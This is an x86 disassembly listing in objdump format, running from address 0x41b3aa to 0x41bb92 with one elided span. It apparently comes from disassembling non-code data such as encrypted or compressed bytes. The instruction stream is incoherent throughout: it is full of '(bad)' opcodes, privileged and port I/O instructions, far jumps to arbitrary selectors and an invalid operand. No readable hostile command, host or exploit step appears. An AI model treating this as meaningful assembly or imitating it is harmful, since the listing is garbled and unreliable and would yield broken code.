  41b3aa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b3ab:	test   BYTE PTR [eax-0x1d],dl
  41b3ae:	lods   al,BYTE PTR ds:[esi]
  41b3af:	add    al,0x22
  41b3b1:	push   edi
  41b3b2:	es add dl,dh
  41b3b5:	sbb    DWORD PTR [esi-0x1dc49e9a],edx
  41b3bb:	int3   
  41b3bc:	cwde   
  41b3bd:	pushf  
  41b3be:	mov    ds:0x7969fb92,al
  41b3c3:	inc    edx
  41b3c4:	add    BYTE PTR [eax-0x1f],0xab
  41b3c8:	sahf   
  41b3c9:	push   0xffffff9a
  41b3cb:	popf   
  41b3cc:	fsub   QWORD PTR [edi-0x58]
  41b3cf:	(bad)  
  41b3d1:	xor    ebx,DWORD PTR ds:0xd322a444
  41b3d7:	imul   esi,DWORD PTR [ebx-0x4706c710],0xffffffc5
  41b3de:	test   edi,esi
  41b3e0:	push   esi
  41b3e1:	fist   WORD PTR [eax]
  41b3e3:	cmp    DWORD PTR [ebx+0x5db7d9fe],ecx
  41b3e9:	sub    ch,BYTE PTR [esi+0x59]
  41b3ec:	sub    DWORD PTR [esi-0x2fe34ff5],edi
  41b3f2:	test   DWORD PTR [edi+0x462f91c8],edi
  41b3f8:	scas   eax,DWORD PTR es:[edi]
  41b3f9:	mov    eax,0xc7e866ef
  41b3fe:	test   al,0xc4
  41b400:	mov    cs,eax
  41b402:	pushf  
  41b403:	sub    bl,ch
  41b405:	mov    edx,0xebaacb32
  41b40a:	add    edi,0x8a7ab3ae
  41b410:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b411:	les    ebp,FWORD PTR [ebx+ecx*4+0x7c40bad6]
  41b418:	cmp    al,0x88
  41b41a:	mov    WORD PTR [edi+0xc],fs
  41b41d:	push   0xffffffec
  41b41f:	test   edx,eax
  41b421:	lock test DWORD PTR [ebx+0x6a],ecx
  41b425:	xchg   esp,eax
  41b426:	adc    BYTE PTR [esi-0x6da7def0],dl
  41b42c:	mov    DWORD PTR [esi-0xb28b112],ebx
  41b432:	jbe    0x41b3f3
  41b434:	xchg   ebx,eax
  41b435:	pop    ecx
  41b436:	fwait
  41b437:	mov    dh,0x43
  41b439:	test   al,0x37
  41b43b:	dec    ebx
  41b43c:	loope  0x41b3fd
  41b43e:	add    eax,0x354aef18
  41b443:	retf   
  41b444:	xchg   esp,eax
  41b445:	int3   
  41b446:	mov    ecx,0x81ebf3d0
  41b44b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b44c:	inc    edx
  41b44d:	mov    edi,0x74e0e36d
  41b452:	mov    ds:0x433766c8,eax
  41b457:	mov    ah,0x89
  41b459:	xchg   esp,eax
  41b45a:	jmp    0x41b478
  41b45c:	xor    BYTE PTR [edi],ah
  41b45e:	cld    
  41b45f:	cmp    al,0x8
  41b461:	(bad)  
  41b462:	push   cs
  41b463:	jecxz  0x41b449
  41b465:	aad    0xae
  41b467:	dec    esi
  41b468:	fst    DWORD PTR [edi+0x2c76ebab]
  41b46e:	test   al,0x8
  41b470:	scas   eax,DWORD PTR es:[edi]
  41b471:	sbb    bl,BYTE PTR [ecx]
  41b473:	lods   eax,DWORD PTR ds:[esi]
  41b474:	(bad)  
  41b476:	aaa    
  41b477:	and    ch,BYTE PTR [edx+0x6a0975e9]
  41b47d:	xchg   BYTE PTR [edx+0x33],bl
  41b480:	scas   al,BYTE PTR es:[edi]
  41b481:	pop    ss
  41b482:	les    edx,FWORD PTR [ecx-0x4b]
  41b485:	mov    edx,0x58a4a1e5
  41b48a:	sub    ecx,ebp
  41b48c:	fwait
  41b48d:	mov    eax,0x309b5ce7
  41b492:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b493:	das    
  41b494:	pop    ds
  41b495:	data16 (bad) 
  41b497:	cli    
	...
  41b514:	pop    ebp
  41b515:	add    DWORD PTR [edx+0x7debdeea],0x4880e6b7
  41b51f:	ror    BYTE PTR [ebp+eiz*1+0x53adb815],cl
  41b526:	add    DWORD PTR [eax],eax
  41b528:	ins    BYTE PTR es:[edi],dx
  41b529:	pop    es
  41b52a:	add    BYTE PTR [eax],al
  41b52c:	jp     0x41b59b
  41b52e:	mov    ebp,DWORD PTR [eax+edi*1+0x58539686]
  41b535:	cli    
  41b536:	(bad)  [edx+0x49]
  41b539:	push   ss
  41b53a:	pop    eax
  41b53b:	jge    0x41b588
  41b53d:	sub    eax,0x57cb53de
  41b542:	or     eax,0x36b8116f
  41b547:	cmp    al,0x79
  41b549:	daa    
  41b54a:	(bad)  
  41b54b:	xor    eax,0xb37c0ec4
  41b550:	inc    ecx
  41b551:	rol    BYTE PTR [ebx],0x18
  41b554:	lahf   
  41b555:	cmp    al,0xe0
  41b557:	push   edx
  41b558:	cmp    BYTE PTR [esi-0x568ea833],ch
  41b55e:	add    DWORD PTR [edx],0xffffffaa
  41b561:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b562:	push   ds
  41b563:	xor    DWORD PTR [ecx+0x45],ebp
  41b566:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b567:	rol    dl,cl
  41b569:	sub    BYTE PTR [ecx],al
  41b56b:	call   0x549ed8aa
  41b570:	test   al,0x85
  41b572:	jne    0x41b4f5
  41b574:	(bad)  
  41b575:	inc    esp
  41b576:	daa    
  41b577:	add    DWORD PTR [ecx],edi
  41b579:	mov    al,0xdd
  41b57b:	pushf  
  41b57c:	cmc    
  41b57d:	adc    eax,DWORD PTR [esi+0x63]
  41b580:	sub    ch,dl
  41b582:	js     0x41b515
  41b584:	push   es
  41b585:	sahf   
  41b586:	push   0x3d
  41b588:	mov    bh,0xdc
  41b58a:	aas    
  41b58b:	jl     0x41b58a
  41b58d:	mov    ebx,0x98cd828
  41b592:	aas    
  41b593:	xor    BYTE PTR [eax-0x40],cl
  41b596:	call   0x353a:0xd2894aa9
  41b59d:	aas    
  41b59e:	ficomp WORD PTR [ebx-0x10]
  41b5a1:	jle    0x41b5ae
  41b5a3:	fmul   st(0),st
  41b5a5:	idiv   BYTE PTR ds:[edi-0x4b26da4b]
  41b5ac:	mov    eax,ds:0xc712c3b6
  41b5b1:	int    0xae
  41b5b3:	jl     0x41b584
  41b5b5:	xor    al,0x9a
  41b5b7:	loopne 0x41b5b0
  41b5b9:	mov    edx,0xdddabff5
  41b5be:	mov    bl,0xc0
  41b5c0:	cdq    
  41b5c1:	bnd ja 0x41b550
  41b5c4:	call   0xe3df:0x95c01f90
  41b5cb:	xchg   edx,eax
  41b5cc:	inc    esi
  41b5cd:	clc    
  41b5ce:	dec    edi
  41b5cf:	dec    ebp
  41b5d0:	mov    cl,0xce
  41b5d2:	addr16 jg 0x41b643
  41b5d5:	loope  0x41b57a
  41b5d7:	or     eax,DWORD PTR [edi-0x2076bbe6]
  41b5dd:	inc    ecx
  41b5de:	mov    ds:0xda0f875e,eax
  41b5e3:	lea    eax,[ebx+0x4f]
  41b5e6:	aas    
  41b5e7:	jo     0x41b58a
  41b5e9:	pop    esi
  41b5ea:	arpl   cx,si
  41b5ec:	mov    bl,0xfe
  41b5ee:	cmps   DWORD PTR cs:[esi],DWORD PTR es:[edi]
  41b5f0:	cmp    ebx,DWORD PTR [eax-0x1a]
  41b5f3:	lock push es
  41b5f5:	sbb    ecx,DWORD PTR [eax+edi*1-0x50]
  41b5f9:	inc    ebp
  41b5fa:	xor    al,0x5b
  41b5fc:	stc    
  41b5fd:	push   ss
  41b5fe:	fwait
  41b5ff:	aad    0x65
  41b601:	add    al,0x2e
  41b603:	mov    dh,0xf
  41b605:	dec    esi
  41b606:	adc    al,BYTE PTR [esi+0x70]
  41b609:	push   es
  41b60a:	jle    0x41b5ed
  41b60c:	and    al,0xba
  41b60e:	sti    
  41b60f:	fs pushf 
  41b611:	sub    DWORD PTR [eax-0x20be2ca0],0x1731212b
  41b61b:	sub    ebx,DWORD PTR [eax]
  41b61d:	mov    eax,0x911ce446
  41b622:	mov    ds:0x426ab73d,al
  41b627:	inc    ebp
  41b628:	fcomi  st,st(1)
  41b62a:	xor    al,0x43
  41b62c:	mov    edi,0xadd328b4
  41b631:	stos   BYTE PTR es:[edi],al
  41b632:	xchg   ebx,eax
  41b633:	mov    BYTE PTR [edi+eax*4-0xb],0x4c
  41b638:	add    dl,bh
  41b63a:	sbb    BYTE PTR [ebx-0x7985c54a],ch
  41b640:	xchg   ecx,eax
  41b641:	ror    BYTE PTR [eax],0x16
  41b644:	inc    eax
  41b645:	cmp    eax,0x27892252
  41b64a:	retf   
  41b64b:	repnz and al,0x41
  41b64e:	xor    al,0x83
  41b650:	dec    edx
  41b651:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b652:	mov    eax,ds:0xce85a058
  41b657:	cmp    al,0x3f
  41b659:	cmp    BYTE PTR ss:[ecx-0x4321b111],dl
  41b660:	or     eax,0x2cbcc499
  41b665:	sbb    DWORD PTR [eax],edi
  41b667:	sbb    DWORD PTR [esi-0x2940d1b0],ecx
  41b66d:	in     al,dx
  41b66e:	jmp    0x41b637
  41b670:	aas    
  41b671:	or     ebp,0xfffffffa
  41b674:	fdivr  st(2),st
  41b676:	add    al,0x8b
  41b678:	or     BYTE PTR [ebp-0x3d7e787],0xce
  41b67f:	push   0x73ed9504
  41b684:	add    BYTE PTR [edi-0x18306680],dh
  41b68a:	enter  0x60af,0x77
  41b68e:	inc    ecx
  41b68f:	jne    0x41b708
  41b691:	jae    0x41b6bd
  41b693:	shl    dl,cl
  41b695:	cmp    al,BYTE PTR [edx+ebx*8-0x50d6957a]
  41b69c:	test   eax,0x4272038f
  41b6a1:	(bad)  
  41b6a2:	out    dx,al
  41b6a3:	jnp    0x41b71a
  41b6a5:	ins    BYTE PTR es:[edi],dx
  41b6a6:	sbb    DWORD PTR [ecx+0x416ef39f],0x6e
  41b6ad:	retf   
  41b6ae:	and    BYTE PTR [esi+0x48f2ae3b],dl
  41b6b4:	inc    edi
  41b6b5:	fwait
  41b6b6:	cmp    eax,0xc36021c3
  41b6bb:	mov    DWORD PTR [eax-0x2a],ebp
  41b6be:	test   BYTE PTR [ecx],ch
  41b6c0:	mov    al,0x61
  41b6c2:	xor    BYTE PTR [edi],ch
  41b6c4:	xchg   BYTE PTR [ebx-0x64],bl
  41b6c7:	fsubp  st(3),st
  41b6c9:	stos   BYTE PTR es:[edi],al
  41b6ca:	mov    gs,WORD PTR [ebx+0x1ef122d8]
  41b6d0:	xor    eax,0xfbae5299
  41b6d5:	lahf   
  41b6d6:	push   0x201ee47b
  41b6db:	iret   
  41b6dc:	cmc    
  41b6dd:	sbb    ecx,ebp
  41b6df:	mov    bl,0x42
  41b6e2:	xor    esp,DWORD PTR [ebx+ecx*8+0x7]
  41b6e6:	jecxz  0x41b723
  41b6e8:	mov    edx,0xc7a0b18f
  41b6ed:	je     0x41b71c
  41b6ef:	xlat   BYTE PTR ds:[ebx]
  41b6f0:	fld    QWORD PTR ds:0xecef747
  41b6f6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b6f7:	enter  0x4b66,0xd7
  41b6fb:	sbb    ebx,0x37
  41b6fe:	xchg   esp,eax
  41b6ff:	int    0x1e
  41b701:	movntps XMMWORD PTR [ecx-0x5e],xmm0
  41b705:	das    
  41b706:	and    eax,0xcd372f72
  41b70b:	pop    ebp
  41b70c:	mov    ah,0x7e
  41b70e:	fldcw  WORD PTR [ebp-0x1b]
  41b711:	mov    ebx,0x13a7fd9d
  41b716:	push   es
  41b717:	retf   0xd75e
  41b71a:	daa    
  41b71b:	retf   
  41b71c:	add    DWORD PTR [edx+0x24],ebp
  41b71f:	mov    ecx,0xe185e2f9
  41b724:	sbb    eax,0x1884b2d3
  41b729:	fidiv  DWORD PTR [ebp+0x10f4bb63]
  41b72f:	nop
  41b730:	mov    ?,WORD PTR [edx+0x76]
  41b733:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b734:	js     0x41b74f
  41b736:	mov    cl,0xa4
  41b738:	push   ds
  41b739:	cmp    BYTE PTR [edi+eax*8],ah
  41b73c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b73d:	inc    edx
  41b73e:	xchg   ebp,eax
  41b73f:	mov    bh,0x88
  41b741:	or     eax,DWORD PTR [edx-0x692deb10]
  41b747:	popf   
  41b748:	inc    ebp
  41b749:	idiv   BYTE PTR [edi+0x11]
  41b74c:	push   eax
  41b74d:	jb     0x41b76c
  41b74f:	loopne 0x41b71d
  41b751:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b752:	push   esi
  41b753:	enter  0xc734,0x9b
  41b757:	mov    bl,0xc7
  41b759:	dec    ebp
  41b75a:	pop    edi
  41b75b:	inc    ecx
  41b75c:	clc    
  41b75d:	and    eax,ebp
  41b75f:	xor    DWORD PTR [esi+eax*8-0x53181c5e],0x1ebae1bc
  41b76a:	nop
  41b76b:	cmp    ebx,DWORD PTR [ecx+0x62]
  41b76e:	cli    
  41b76f:	ins    DWORD PTR es:[edi],dx
  41b770:	loope  0x41b711
  41b772:	dec    edi
  41b773:	mov    di,0x2bef
  41b777:	nop
  41b778:	sub    esp,DWORD PTR [esi+0x4c0642a4]
  41b77e:	mov    ebp,0xbeb54f13
  41b783:	inc    BYTE PTR [ecx]
  41b785:	sbb    edx,edx
  41b787:	push   ebp
  41b788:	dec    edx
  41b789:	fs ss ins BYTE PTR es:[edi],dx
  41b78c:	lods   al,BYTE PTR ds:[esi]
  41b78d:	mov    bl,0x6a
  41b78f:	repnz (bad) 
  41b791:	mov    ds:0xeb0bf2d8,al
  41b796:	in     al,0xb4
  41b798:	dec    esi
  41b799:	aad    0x75
  41b79b:	jmp    0x7e14:0x9f8229bb
  41b7a2:	mov    di,0x29c6
  41b7a6:	lock inc edx
  41b7a8:	xchg   ebp,eax
  41b7a9:	out    0xd3,al
  41b7ab:	imul   ebx,DWORD PTR [ebx-0x49],0x1a031467
  41b7b2:	lock fs push 0xb63da032
  41b7b9:	inc    edx
  41b7ba:	stc    
  41b7bb:	pop    eax
  41b7bc:	cld    
  41b7bd:	add    bl,bh
  41b7bf:	in     eax,dx
  41b7c0:	xchg   ebp,eax
  41b7c1:	xchg   edx,eax
  41b7c2:	adc    DWORD PTR [ebx+0x21e735bb],0x18c89412
  41b7cc:	inc    edi
  41b7cd:	icebp  
  41b7ce:	int3   
  41b7cf:	js     0x41b79b
  41b7d1:	sub    DWORD PTR [ebx+0x3b],esi
  41b7d4:	mov    dl,0x25
  41b7d6:	and    al,0xd6
  41b7d8:	push   edx
  41b7d9:	adc    edx,ebp
  41b7db:	mov    DWORD PTR [esi+0x6a24c347],edx
  41b7e1:	retf   
  41b7e2:	lods   eax,DWORD PTR ds:[esi]
  41b7e3:	pop    edi
  41b7e4:	mov    al,ds:0x6f8d40dd
  41b7e9:	icebp  
  41b7ea:	xchg   BYTE PTR [edi],ah
  41b7ec:	mov    ebp,0x45eb04ca
  41b7f1:	cmp    eax,DWORD PTR [ebx+0x5fd6fd51]
  41b7f7:	cmp    DWORD PTR [edx-0x79],ebp
  41b7fa:	mov    al,ds:0xdb5ed8e9
  41b7ff:	int3   
  41b800:	sahf   
  41b801:	aam    0x8e
  41b803:	and    dl,BYTE PTR [eax-0x74]
  41b806:	cmp    bl,BYTE PTR [ebp+edx*4-0x26]
  41b80a:	adc    ecx,ecx
  41b80c:	in     al,0x2a
  41b80e:	dec    ebp
  41b80f:	dec    esi
  41b810:	jb     0x41b888
  41b812:	dec    edi
  41b813:	and    DWORD PTR [eax-0x5b595f74],edx
  41b819:	mov    ebp,0x41ccc157
  41b81e:	cli    
  41b81f:	xchg   ecx,eax
  41b820:	mov    bh,0x6b
  41b822:	int3   
  41b823:	jae    0x41b807
  41b825:	jg     0x41b7c3
  41b827:	rcr    DWORD PTR [ecx+esi*4-0x5dd74983],1
  41b82e:	xlat   BYTE PTR ds:[ebx]
  41b82f:	or     al,0xf7
  41b831:	xor    dl,BYTE PTR [esi-0x1a30cfca]
  41b837:	adc    esp,DWORD PTR [ecx-0x3a]
  41b83a:	dec    eax
  41b83b:	push   ebx
  41b83c:	pop    esi
  41b83d:	enter  0x8998,0xf9
  41b841:	call   0x18a3f693
  41b846:	in     al,dx
  41b847:	(bad)
  41b84b:	popa   
  41b84c:	pop    ebp
  41b84d:	push   es
  41b84e:	dec    esp
  41b84f:	mov    ebp,0xc2da9ebd
  41b854:	mov    DWORD PTR [esi+0x3ac7dc6],eax
  41b85a:	cmp    edi,DWORD PTR ds:0x8ea9aa2d
  41b860:	add    BYTE PTR [edi-0x2f9278b4],ah
  41b866:	jmp    0x28dd:0xeb4caf71
  41b86d:	imul   BYTE PTR [ebp+0x43a7d62e]
  41b873:	mov    al,ds:0xa4d3d1cb
  41b878:	jmp    0xa72af431
  41b87d:	jge    0x41b893
  41b87f:	sbb    al,0x7d
  41b881:	ret    
  41b882:	add    DWORD PTR [esp+edx*1-0x27bd54bd],esp
  41b889:	je     0x41b829
  41b88b:	and    DWORD PTR [edx],eax
  41b88d:	xchg   ecx,eax
  41b88e:	mov    ebp,0xc4998f05
  41b893:	cmovns esi,DWORD PTR [eax]
  41b896:	xchg   ebx,eax
  41b897:	out    0xe2,al
  41b899:	inc    esp
  41b89a:	mov    esi,ecx
  41b89c:	icebp  
  41b89d:	inc    ebp
  41b89e:	pusha  
  41b89f:	cld    
  41b8a0:	call   0x656291bc
  41b8a5:	cdq    
  41b8a6:	lock mov ch,0x1b
  41b8a9:	retf   
  41b8aa:	or     edx,DWORD PTR [esi-0x26386633]
  41b8b0:	xchg   edi,eax
  41b8b1:	inc    ebp
  41b8b2:	repz mov bl,0x24
  41b8b5:	push   ebp
  41b8b6:	inc    ebx
  41b8b7:	push   0x66
  41b8b9:	arpl   WORD PTR [edx],sp
  41b8bb:	jne    0x41b84b
  41b8bd:	shr    DWORD PTR [ebx+0x3c22366d],cl
  41b8c3:	cs jae 0x41b88a
  41b8c6:	adc    ch,BYTE PTR ds:0xeb34312
  41b8cc:	fbstp  TBYTE PTR [ebp+0x1cb71c30]
  41b8d2:	add    al,0x2c
  41b8d4:	xchg   ecx,eax
  41b8d5:	adc    edi,DWORD PTR [edx+0x1be2b64d]
  41b8db:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b8dc:	fucomp st(2)
  41b8de:	cld    
  41b8df:	push   es
  41b8e0:	add    DWORD PTR [ebp-0x6a3cad52],edi
  41b8e6:	push   ecx
  41b8e7:	jbe    0x41b93c
  41b8e9:	mov    BYTE PTR ds:0xd94571a7,dl
  41b8ef:	inc    ebp
  41b8f0:	cld    
  41b8f1:	pop    ebp
  41b8f2:	jecxz  0x41b914
  41b8f4:	add    esi,eax
  41b8f6:	push   0x6f43804f
  41b8fb:	dec    ebp
  41b8fc:	jge    0x41b97d
  41b8fe:	xchg   ebp,eax
  41b8ff:	adc    ebp,ecx
  41b901:	repnz push ebp
  41b903:	fld    TBYTE PTR ds:0xd13c4f99
  41b909:	ret    
  41b90a:	(bad)  
  41b90b:	jp     0x41b896
  41b90d:	or     al,0xa6
  41b90f:	push   cs
  41b910:	cmp    ecx,ecx
  41b912:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b913:	push   ss
  41b914:	std    
  41b915:	add    ah,bh
  41b917:	clc    
  41b918:	jg     0x41b8e6
  41b91a:	or     edx,DWORD PTR [ebx+0xf5ce466]
  41b920:	rol    BYTE PTR [ebp-0x1acef9ed],0xe1
  41b927:	hlt    
  41b928:	popa   
  41b929:	fdivr  QWORD PTR [esi]
  41b92b:	jmp    0xc63f:0x39af3e0c
  41b932:	in     eax,0x23
  41b934:	sub    BYTE PTR ds:0x44c9b096,al
  41b93a:	out    dx,eax
  41b93b:	into   
  41b93c:	clc    
  41b93d:	cmp    eax,0x908437f1
  41b942:	test   al,0x7b
  41b944:	shr    BYTE PTR [esi],1
  41b946:	sbb    ch,BYTE PTR [ebp-0x392a5f02]
  41b94c:	and    DWORD PTR [ecx+0x3805eeb9],0x3498c665
  41b956:	jp     0x41b91a
  41b958:	(bad)  
  41b959:	jmp    0xc460d9d5
  41b95e:	pop    ds
  41b95f:	jl     0x41b903
  41b961:	jae    0x41b8f9
  41b963:	pop    ebx
  41b964:	push   ebx
  41b965:	adc    al,0x17
  41b967:	mov    DWORD PTR [esi-0x958b80c],esi
  41b96d:	iret   
  41b96e:	stc    
  41b96f:	adc    ch,BYTE PTR [esi]
  41b971:	mov    cl,0xcc
  41b973:	inc    eax
  41b974:	push   edx
  41b975:	sub    eax,0x6aa6c950
  41b97a:	sub    DWORD PTR ds:0x7d3a841d,0xfffffff7
  41b981:	xchg   edx,eax
  41b982:	iret   
  41b983:	dec    edx
  41b984:	ss push eax
  41b986:	mov    bl,0xb4
  41b988:	add    al,0xc3
  41b98a:	or     ebx,eax
  41b98c:	and    DWORD PTR [ecx-0xf861b87],edx
  41b992:	imul   edx,DWORD PTR [eax+eiz*4],0xffffffae
  41b996:	retf   0xe148
  41b999:	xchg   ecx,eax
  41b99a:	and    DWORD PTR [eax-0x22],eax
  41b99d:	fmul   DWORD PTR [ebx-0x18f073b5]
  41b9a3:	inc    edi
  41b9a4:	pop    esi
  41b9a6:	lods   eax,DWORD PTR ds:[esi]
  41b9a7:	or     cl,BYTE PTR [ecx+0x7f1cf64c]
  41b9ad:	enter  0xb34c,0x24
  41b9b1:	jbe    0x41ba2c
  41b9b3:	mov    bl,0x68
  41b9b5:	out    dx,al
  41b9b6:	retf   0xccb0
  41b9b9:	shl    BYTE PTR [ecx],1
  41b9bb:	ficomp WORD PTR [edx+eiz*2-0x24]
  41b9bf:	retf   0x927e
  41b9c2:	dec    esp
  41b9c3:	ins    DWORD PTR es:[edi],dx
  41b9c4:	push   0x2423e023
  41b9c9:	data16 jmp 0x41b96d
  41b9cc:	scas   al,BYTE PTR es:[edi]
  41b9cd:	xchg   esi,eax
  41b9ce:	lods   al,BYTE PTR ds:[esi]
  41b9cf:	dec    ecx
  41b9d0:	ja     0x41b9c2
  41b9d2:	inc    edi
  41b9d3:	aam    0x2b
  41b9d5:	rep es ins DWORD PTR es:[edi],dx
  41b9d8:	push   esi
  41b9d9:	hlt    
  41b9da:	ret    0xf31b
  41b9dd:	mov    ds:0x292e365b,al
  41b9e2:	mov    al,0xa4
  41b9e4:	xchg   al,ah
  41b9e6:	sub    cl,BYTE PTR [edx+0x77]
  41b9e9:	retf   
  41b9ea:	hlt    
  41b9eb:	mov    cl,0xba
  41b9ed:	stos   BYTE PTR es:[edi],al
  41b9ee:	cmp    DWORD PTR [esi],0xaab572a6
  41b9f4:	add    eax,0x5f6a44fa
  41b9f9:	dec    eax
  41b9fa:	xor    BYTE PTR [eax+0x4a],dl
  41b9fd:	pop    edi
  41b9fe:	cmp    DWORD PTR [ebx],eax
  41ba00:	retf   0x7ac7
  41ba03:	pop    ds
  41ba04:	faddp  st(1),st
  41ba06:	xor    BYTE PTR [esp+ecx*1-0x584edc24],bh
  41ba0d:	push   0x84051898
  41ba12:	push   es
  41ba13:	fadd   QWORD PTR [edx+0x6770e942]
  41ba19:	inc    ecx
  41ba1a:	sub    eax,0x6148d4f1
  41ba1f:	sti    
  41ba20:	dec    esi
  41ba21:	xor    al,0xe0
  41ba23:	cmc    
  41ba24:	dec    edi
  41ba25:	mov    ch,0xdc
  41ba27:	fs hlt 
  41ba29:	aam    0x95
  41ba2b:	repz inc edi
  41ba2d:	cmp    BYTE PTR [eax-0x788dae1d],0xb3
  41ba34:	xor    ebp,ebx
  41ba36:	inc    ecx
  41ba37:	pop    es
  41ba38:	imul   ecx,DWORD PTR [esi+0x59],0x40
  41ba3c:	push   esp
  41ba3d:	adc    DWORD PTR [ebp-0x33],edi
  41ba40:	out    dx,eax
  41ba41:	and    dl,dh
  41ba43:	jecxz  0x41ba8d
  41ba45:	ins    BYTE PTR es:[edi],dx
  41ba46:	add    edx,edx
  41ba48:	or     DWORD PTR [eax+edx*8],ebx
  41ba4b:	pop    esi
  41ba4c:	push   esp
  41ba4d:	int3   
  41ba4e:	(bad)  
  41ba4f:	cmc    
  41ba50:	xchg   edi,eax
  41ba51:	jb     0x41b9e2
  41ba53:	jp     0x41baaa
  41ba55:	mov    dh,BYTE PTR [edi+0x3a]
  41ba58:	xor    DWORD PTR [edi],ebp
  41ba5a:	xchg   ebx,eax
  41ba5b:	xor    eax,0x9c0372fd
  41ba60:	jo     0x41b9fb
  41ba62:	jo     0x41ba2c
  41ba64:	outs   dx,DWORD PTR ds:[esi]
  41ba65:	inc    ebp
  41ba66:	daa    
  41ba67:	push   ebx
  41ba68:	mov    esi,0x41b6c82a
  41ba6d:	pushf  
  41ba6e:	cdq    
  41ba6f:	push   ss
  41ba70:	mov    ebx,0x420b11a2
  41ba75:	push   edi
  41ba76:	inc    eax
  41ba77:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ba78:	push   ecx
  41ba79:	or     bh,bl
  41ba7b:	in     eax,0xc5
  41ba7d:	aas    
  41ba7e:	ss dec esi
  41ba80:	sbb    edi,esp
  41ba82:	(bad)  
  41ba84:	mov    ecx,DWORD PTR [ebx-0x3a50a9d0]
  41ba8a:	jb     0x41ba9f
  41ba8c:	fsub   QWORD PTR [ebx+0x6f9b3ac2]
  41ba92:	gs loop 0x41ba68
  41ba95:	inc    ecx
  41ba96:	mov    esp,0x81928aef
  41ba9b:	int3   
  41ba9c:	adc    DWORD PTR [ecx],esp
  41ba9e:	xor    DWORD PTR [esi-0xa1c84a3],edi
  41baa4:	(bad)  
  41baa5:	in     eax,dx
  41baa6:	arpl   WORD PTR [edi-0x5f],di
  41baa9:	popa   
  41baaa:	sahf   
  41baab:	pop    ds
  41baac:	fcmove st,st(2)
  41baae:	xchg   edx,eax
  41baaf:	sbb    al,0x92
  41bab1:	in     al,0xb5
  41bab3:	cmp    ebx,edx
  41bab5:	xlat   BYTE PTR ds:[ebx]
  41bab6:	lahf   
  41bab7:	les    edx,FWORD PTR [eax+0x44]
  41baba:	shr    DWORD PTR [ecx+eax*8-0x6f],1
  41babe:	scas   al,BYTE PTR es:[edi]
  41babf:	cmp    al,0x34
  41bac1:	and    eax,0xdc53e0fc
  41bac6:	sbb    BYTE PTR [edi],cl
  41bac8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bac9:	xor    al,0xeb
  41bacb:	pop    ds
  41bacc:	sahf   
  41bacd:	jnp    0x41badf
  41bacf:	sub    DWORD PTR [eax-0x74435b78],0x1
  41bad6:	and    ch,BYTE PTR [esi+0x79]
  41bad9:	mov    ds:0xfbb7733d,al
  41bade:	cmp    eax,0x13877933
  41bae3:	jp     0x41bb53
  41bae5:	fldcw  WORD PTR [eax]
  41bae7:	push   ss
  41bae8:	mov    bh,0x99
  41baea:	shr    DWORD PTR [ebp+0x226d17d4],cl
  41baf0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41baf1:	icebp  
  41baf2:	and    dl,BYTE PTR [edi-0x22]
  41baf5:	jae    0x41ba84
  41baf7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41baf8:	pusha  
  41baf9:	mov    esp,0x5b294801
  41bafe:	sbb    al,0xb1
  41bb00:	loopne 0x41bafd
  41bb02:	(bad)  
  41bb03:	lods   al,BYTE PTR fs:[esi]
  41bb05:	out    dx,al
  41bb06:	leave  
  41bb07:	nop
  41bb08:	mov    fs,WORD PTR [edx+0x70]
  41bb0b:	fiadd  WORD PTR [esi]
  41bb0d:	pop    ebp
  41bb0e:	or     DWORD PTR [ecx+0x49a1228a],eax
  41bb14:	loop   0x41bb86
  41bb16:	mov    edi,0xe0951c86
  41bb1b:	dec    eax
  41bb1c:	push   esi
  41bb1d:	rcl    cl,cl
  41bb1f:	jne    0x41bb32
  41bb21:	and    ch,BYTE PTR [edx-0x2b586c6c]
  41bb27:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bb28:	(bad)  [edx-0x4b]
  41bb2b:	(bad)  
  41bb2d:	popf   
  41bb2e:	out    0x76,al
  41bb30:	mov    ecx,0x44f56f91
  41bb35:	addr16 je 0x41bb02
  41bb38:	xor    dl,BYTE PTR [esi]
  41bb3a:	jnp    0x41bbaa
  41bb3c:	(bad)  
  41bb3d:	scas   al,BYTE PTR es:[edi]
  41bb3e:	mov    bh,0x91
  41bb40:	inc    edx
  41bb41:	sub    cl,BYTE PTR [edi]
  41bb43:	jge    0x41baeb
  41bb45:	in     al,0xb1
  41bb47:	mov    WORD PTR [esi+ecx*8-0x42],cs
  41bb4b:	sub    ecx,DWORD PTR [ebp-0x18]
  41bb4e:	dec    eax
  41bb4f:	test   BYTE PTR [edx+0x4f],0x3d
  41bb53:	lds    edi,FWORD PTR [esi]
  41bb55:	push   eax
  41bb56:	sbb    DWORD PTR [edx+0x5b],0xc9830ba1
  41bb5d:	and    edx,DWORD PTR [edi-0x7ee21949]
  41bb63:	jmp    0x47fb:0x7dba35cb
  41bb6a:	xchg   esp,eax
  41bb6b:	fbld   TBYTE PTR [ebx]
  41bb6d:	and    eax,0x9eb2bd38
  41bb72:	sbb    edi,DWORD PTR [edi+edx*8-0x66]
  41bb76:	or     al,0x91
  41bb78:	xor    bl,BYTE PTR [ecx+0x32]
  41bb7b:	pop    ebp
  41bb7c:	sub    eax,0x9deeb2a2
  41bb81:	repnz dec ebp
  41bb83:	inc    esi
  41bb84:	fld    TBYTE PTR [ecx-0x3a]
  41bb87:	and    edx,DWORD PTR [edx]
  41bb89:	jp     0x41bbfb
  41bb8b:	cmc    
  41bb8c:	gs cmp edi,0x3e
  41bb90:	mov    cl,0x52
  41bb92:	and    DWORD PTR [edx],esp
